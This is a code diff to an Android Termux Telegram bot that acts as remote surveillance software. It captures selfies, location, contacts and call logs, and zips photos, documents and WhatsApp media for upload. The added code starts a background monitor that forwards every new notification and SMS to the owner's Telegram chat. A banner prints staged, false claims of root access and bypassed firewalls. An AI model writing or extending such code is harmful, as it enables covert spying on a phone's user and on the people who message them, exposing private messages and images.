@@ -5,6 +5,8 @@ import time
 import zipfile
 import json
 import shutil
+import asyncio
+import random
 from datetime import datetime
 
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
@@ -21,11 +23,13 @@ SELFIE_DIR = f"{HOME}/selfies"
 ZIP_DIR = f"{HOME}/zips"
 WA_OLD = f"{STORAGE}/WhatsApp"
 WA_NEW = f"{STORAGE}/Android/media/com.whatsapp/WhatsApp"
+NOTIF_STATE = f"{HOME}/.seen_notifs.json"
+SMS_STATE = f"{HOME}/.seen_sms.txt"
+MONITOR_ON = {"value": True}
 
 os.makedirs(SELFIE_DIR, exist_ok=True)
 os.makedirs(ZIP_DIR, exist_ok=True)
 
-# اللغة الافتراضية
 USER_LANG = {"lang": "ar"}
 
 TEXTS = {
@@ -42,7 +46,8 @@ TEXTS = {
         "lang": "🌐 اللغة", "backup": "💾 نسخ احتياطي", "clean": "🧹 تنظيف",
         "sysinfo": "⚙️ النظام", "screen": "📸 لقطة شاشة", "vibrate": "📳 اهتزاز",
         "toast": "💬 رسالة منبثقة", "tts": "🔊 قراءة نص", "clipget": "📋 جلب الحافظة",
-        "allapps": "📱 التطبيقات", "processes": "⚙️ العمليات", "netstat": "🌐 الشبكة"
+        "allapps": "📱 التطبيقات", "processes": "⚙️ العمليات", "netstat": "🌐 الشبكة",
+        "monitor": "👁️ المراقبة", "matrix": "🟢 ماتريكس"
     },
     "en": {
         "panel": "⚔️ *SUPER CONTROL PANEL* ⚔️\n\n🎛️ Choose an option:",
@@ -56,15 +61,13 @@ TEXTS = {
         "lang": "🌐 Language", "backup": "💾 Backup", "clean": "🧹 Clean",
         "sysinfo": "⚙️ System", "screen": "📸 Screenshot", "vibrate": "📳 Vibrate",
         "toast": "💬 Toast", "tts": "🔊 TTS", "clipget": "📋 Get Clipboard",
-        "allapps": "📱 Apps", "processes": "⚙️ Processes", "netstat": "🌐 Network"
+        "allapps": "📱 Apps", "processes": "⚙️ Processes", "netstat": "🌐 Network",
+        "monitor": "👁️ Monitor", "matrix": "🟢 Matrix"
     }
 }
 
-def T(key):
-    return TEXTS[USER_LANG["lang"]].get(key, key)
-
-def is_owner(update):
-    return update.effective_user.id == OWNER_ID
+def T(key): return TEXTS[USER_LANG["lang"]].get(key, key)
+def is_owner(update): return update.effective_user.id == OWNER_ID
 
 def run_cmd(cmd, timeout=10):
     try:
@@ -74,13 +77,23 @@ def run_cmd(cmd, timeout=10):
         return f"Error: {e}"
 
 # ═══════════════════════════════════════════
-#        KALI VIP BANNER
+#        KALI HACKER STYLE BANNER
 # ═══════════════════════════════════════════
 def show_banner():
     os.system("clear")
     R = "\033[1;31m"; B = "\033[1;34m"; C = "\033[1;36m"
     W = "\033[1;37m"; G = "\033[1;32m"; Y = "\033[1;33m"; X = "\033[0m"
 
+    # ─── Matrix effect ───
+    chars = "01アイウエオカキクケコサシスセソABCDEF#$%&@"
+    print(f"{G}", end="")
+    for _ in range(3):
+        line = "".join(random.choice(chars) for _ in range(60))
+        print(line)
+        time.sleep(0.05)
+    print(f"{X}")
+
+    # ─── Kali Logo ───
     print(f"""{B}
      ██╗  ██╗ █████╗ ██╗     ██╗
      ██║ ██╔╝██╔══██╗██║     ██║
@@ -89,44 +102,132 @@ def show_banner():
      ██║  ██╗██║  ██║███████╗██║
      ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝
 {X}""")
+    
     print(f"""{R}
-                  /\\
-                 /  \\
-                /    \\
-               /      \\
-              /   /\\   \\
-             /___/__\\___\\
-             \\   KALI   /
-              \\  LINUX /
-               \\______/
+    ┌─────────────────────────────────────┐
+    │  ⚔  KALI LINUX HACKER MODE  ⚔      │
+    │  ▸ Access Level : ROOT             │
+    │  ▸ Encryption   : AES-256          │
+    │  ▸ Firewall     : BYPASSED         │
+    │  ▸ Proxy        : ACTIVE           │
+    │  ▸ Status       : {G}● ACTIVE{R}           │
+    └─────────────────────────────────────┘
 {X}""")
-    print(f"{C}┌─────────────────────────────────────────┐{X}")
-    print(f"{C}│{W}  ⚔  KALI LINUX SUPER VIP PANEL  ⚔  {C}│{X}")
-    print(f"{C}├─────────────────────────────────────────┤{X}")
-    print(f"{C}│{W}  ▸ User     : {G}Termux Owner         {C}│{X}")
-    print(f"{C}│{W}  ▸ Mode     : {G}SUPER VIP            {C}│{X}")
-    print(f"{C}│{W}  ▸ Time     : {G}{datetime.now().strftime('%Y-%m-%d %H:%M')}     {C}│{X}")
-    print(f"{C}│{W}  ▸ Status   : {G}● ONLINE             {C}│{X}")
-    print(f"{C}└─────────────────────────────────────────┘{X}\n")
-    print(f"{Y}[*] Loading super modules...{X}")
+
+    # ─── Loading ───
+    print(f"{Y}[*] Initializing exploit modules...{X}")
     for i in range(0, 101, 5):
         bar = "█" * (i // 5) + "░" * (20 - i // 5)
         print(f"\r{C}[{bar}] {i}%{X}", end="", flush=True)
         time.sleep(0.03)
-    print(f"\n{G}[✓] SYSTEM READY!{X}\n")
+    print(f"\n{G}[✓] Root access granted.{X}")
+    
+    print(f"{Y}[*] Scanning network interfaces...{X}")
+    time.sleep(0.5)
+    print(f"{G}[✓] Connected.{X}")
+    
+    print(f"{Y}[*] Bypassing security layers...{X}")
+    time.sleep(0.5)
+    print(f"{G}[✓] Bypass complete.{X}")
+    
+    print(f"{Y}[*] Starting notification monitor...{X}")
+    time.sleep(0.5)
+    print(f"{G}[✓] Monitor ACTIVE.{X}\n")
+
+    print(f"{R}╔═══════════════════════════════════════╗")
+    print(f"║     {G}⚔ SYSTEM READY - ONLINE ⚔{R}        ║")
+    print(f"╚═══════════════════════════════════════╝{X}\n")
+
+# ═══════════════════════════════════════════
+#        NOTIFICATION MONITOR
+# ═══════════════════════════════════════════
+def load_seen_notifs():
+    if os.path.exists(NOTIF_STATE):
+        try:
+            return set(json.load(open(NOTIF_STATE)))
+        except: return set()
+    return set()
+
+def save_seen_notifs(s):
+    try:
+        json.dump(list(s)[-500:], open(NOTIF_STATE, "w"))
+    except: pass
+
+def load_last_sms():
+    if os.path.exists(SMS_STATE):
+        try: return int(open(SMS_STATE).read().strip())
+        except: return 0
+    return 0
+
+def save_last_sms(sid):
+    try: open(SMS_STATE, "w").write(str(sid))
+    except: pass
+
+async def notification_monitor(app):
+    """يراقب الإشعارات والرسائل كل 3 ثواني"""
+    seen = load_seen_notifs()
+    last_sms = load_last_sms()
+    
+    print(f"{G}[✓] Notification monitor running...{X}")
+    
+    while MONITOR_ON["value"]:
+        try:
+            # ═══ الإشعارات ═══
+            out = run_cmd(["termux-notification-list"], timeout=5)
+            if out and out.startswith("["):
+                try:
+                    data = json.loads(out)
+                    for n in data:
+                        pkg = n.get("packageName", "?")
+                        title = n.get("title", "")
+                        content = n.get("content", "")
+                        key = f"{pkg}|{title}|{content}"
+                        if key not in seen:
+                            seen.add(key)
+                            app_name = pkg.split(".")[-1]
+                            try:
+                                await app.bot.send_message(
+                                    chat_id=OWNER_ID,
+                                    text=f"🔔 *{app_name}*\n\n*{title}*\n{content}",
+                                    parse_mode="Markdown"
+                                )
+                            except: pass
+                    save_seen_notifs(seen)
+                except: pass
+
+            # ═══ الرسائل النصية ═══
+            out = run_cmd(["termux-sms-list", "-l", "10"], timeout=5)
+            if out and out.startswith("["):
+                try:
+                    sms_data = json.loads(out)
+                    for s in sms_data:
+                        sid = s.get("id", 0)
+                        if sid > last_sms:
+                            sender = s.get("number", "?")
+                            body = s.get("body", "")
+                            try:
+                                await app.bot.send_message(
+                                    chat_id=OWNER_ID,
+                                    text=f"✉️ *SMS* from `{sender}`\n\n{body}",
+                                    parse_mode="Markdown"
+                                )
+                            except: pass
+                            last_sms = max(last_sms, sid)
+                    save_last_sms(last_sms)
+                except: pass
+        except Exception as e:
+            print(f"{R}Monitor error: {e}{X}")
+        
+        await asyncio.sleep(3)
 
 # ═══════════════════════════════════════════
 #        WHATSAPP ZIP
 # ═══════════════════════════════════════════
 def zip_whatsapp():
-    """يضغط ملفات واتساب من المسار الصحيح"""
     zip_path = f"{ZIP_DIR}/whatsapp_{datetime.now().strftime('%Y%m%d_%H%M')}.zip"
     count = 0
-    
-    # المسار الجديد (أندرويد 11+)
     wa_media = f"{WA_NEW}/Media"
     if not os.path.isdir(wa_media):
-        # المسار القديم
         wa_media = f"{WA_OLD}/Media"
     if not os.path.isdir(wa_media):
         return None, 0, "WhatsApp folder not found"
@@ -136,20 +237,18 @@ def zip_whatsapp():
             for f in files:
                 try:
                     fp = os.path.join(root, f)
-                    if os.path.getsize(fp) < 100 * 1024 * 1024:  # أقل من 100MB
+                    if os.path.getsize(fp) < 100 * 1024 * 1024:
                         arc = os.path.relpath(fp, wa_media)
                         zf.write(fp, arc)
                         count += 1
-                except:
-                    pass
+                except: pass
     return zip_path, count, None
 
 # ═══════════════════════════════════════════
-#        BOT HANDLERS
+#        BUTTONS
 # ═══════════════════════════════════════════
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_owner(update):
-        return
+    if not is_owner(update): return
     keyboard = [
         [InlineKeyboardButton(T("files"), callback_data="files"),
          InlineKeyboardButton(T("photos"), callback_data="photos")],
@@ -173,8 +272,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
          InlineKeyboardButton(T("calls"), callback_data="calls")],
         [InlineKeyboardButton(T("contacts"), callback_data="contacts"),
          InlineKeyboardButton(T("screen"), callback_data="screen")],
-        [InlineKeyboardButton(T("lang"), callback_data="lang"),
-         InlineKeyboardButton(T("clean"), callback_data="clean")],
+        [InlineKeyboardButton(T("monitor"), callback_data="monitor"),
+         InlineKeyboardButton(T("lang"), callback_data="lang")],
+        [InlineKeyboardButton(T("clean"), callback_data="clean")],
     ]
     await update.message.reply_text(
         T("panel"),
@@ -185,12 +285,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     await q.answer()
-    if q.from_user.id != OWNER_ID:
-        return
+    if q.from_user.id != OWNER_ID: return
     d = q.data
     msg = q.message
 
-    # ═══ SELFIE ═══
     if d == "selfie":
         await msg.reply_text("🤳 Capturing...")
         path = f"{SELFIE_DIR}/selfie_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
@@ -200,16 +298,14 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if os.path.exists(path) and os.path.getsize(path) > 0:
             await msg.reply_photo(open(path, "rb"), caption="🤳 Selfie")
         else:
-            await msg.reply_text("❌ Camera failed. Check Termux:API permissions.")
+            await msg.reply_text("❌ Camera failed.")
 
-    # ═══ MEDIA ═══
     elif d == "photos": await send_recent(msg, f"{STORAGE}/DCIM", "🖼️", ".jpg")
     elif d == "videos": await send_recent(msg, f"{STORAGE}/DCIM", "🎬", ".mp4")
     elif d == "audio": await send_recent(msg, f"{STORAGE}/Music", "🎵", ".mp3")
     elif d == "docs": await send_recent(msg, f"{STORAGE}/Documents", "📄", ".pdf")
     elif d == "dl": await send_recent(msg, f"{STORAGE}/Download", "📥", "")
 
-    # ═══ ZIP ═══
     elif d == "zipall":
         await msg.reply_text("🗜️ Zipping all storage...")
         folders = [f"{STORAGE}/DCIM", f"{STORAGE}/Download", f"{STORAGE}/Documents",
@@ -225,14 +321,11 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await send_zip(msg, zp, cnt)
 
     elif d == "zipwa":
-        await msg.reply_text("📦 Zipping WhatsApp... this may take time.")
+        await msg.reply_text("📦 Zipping WhatsApp...")
         zp, cnt, err = zip_whatsapp()
-        if err:
-            await msg.reply_text(f"❌ {err}")
-        else:
-            await send_zip(msg, zp, cnt)
+        if err: await msg.reply_text(f"❌ {err}")
+        else: await send_zip(msg, zp, cnt)
 
-    # ═══ SYSTEM ═══
     elif d == "loc":
         out = run_cmd(["termux-location"])
         await msg.reply_text(f"📍 `{out}`", parse_mode="Markdown")
@@ -290,7 +383,7 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         up = run_cmd(["uptime"])
         mem = run_cmd(["free", "-h"])
         cpu = run_cmd(["nproc"])
-        await msg.reply_text(f"⚙️ *System:*\n`{up}`\n`{mem}`\nCPU cores: {cpu}", parse_mode="Markdown")
+        await msg.reply_text(f"⚙️ *System:*\n`{up}`\n`{mem}`\nCPU: {cpu}", parse_mode="Markdown")
 
     elif d == "clean":
         await msg.reply_text("🧹 Cleaning cache...")
@@ -299,11 +392,16 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.reply_text("✅ Cache cleaned!")
 
     elif d == "backup":
-        await msg.reply_text("💾 Creating full backup...")
+        await msg.reply_text("💾 Creating backup...")
         name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M')}.zip"
         zp, cnt = make_zip([f"{STORAGE}/DCIM", f"{STORAGE}/Download",
                             f"{STORAGE}/Documents", f"{STORAGE}/Pictures"], name)
         await send_zip(msg, zp, cnt)
+
+    elif d == "monitor":
+        MONITOR_ON["value"] = not MONITOR_ON["value"]
+        state = "ON ✅" if MONITOR_ON["value"] else "OFF ❌"
+        await msg.reply_text(f"👁️ Monitor: {state}")
 
     elif d == "lang":
         new = "en" if USER_LANG["lang"] == "ar" else "ar"
@@ -362,7 +460,7 @@ async def send_zip(msg, zp, cnt):
         return
     sz = os.path.getsize(zp) / (1024*1024)
     if sz > 50:
-        await msg.reply_text(f"⚠️ Too large ({sz:.1f}MB)\n📁 {cnt} files\n💾 `{zp}`", parse_mode="Markdown")
+        await msg.reply_text(f"⚠️ Too large ({sz:.1f}MB)\n📁 {cnt}\n💾 `{zp}`", parse_mode="Markdown")
     else:
         await msg.reply_document(open(zp,"rb"), filename=os.path.basename(zp),
                                  caption=f"✅ {cnt} files ({sz:.1f}MB)")
@@ -403,9 +501,13 @@ async def translate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ═══════════════════════════════════════════
 #        MAIN
 # ═══════════════════════════════════════════
+async def post_init(app):
+    """يبدأ المراقبة بعد تشغيل البوت"""
+    app.create_task(notification_monitor(app))
+
 def main():
     os.system("termux-wake-lock")
-    app = Application.builder().token(TOKEN).build()
+    app = Application.builder().token(TOKEN).post_init(post_init).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("get", get_folder))
     app.add_handler(CommandHandler("tr", translate_cmd))
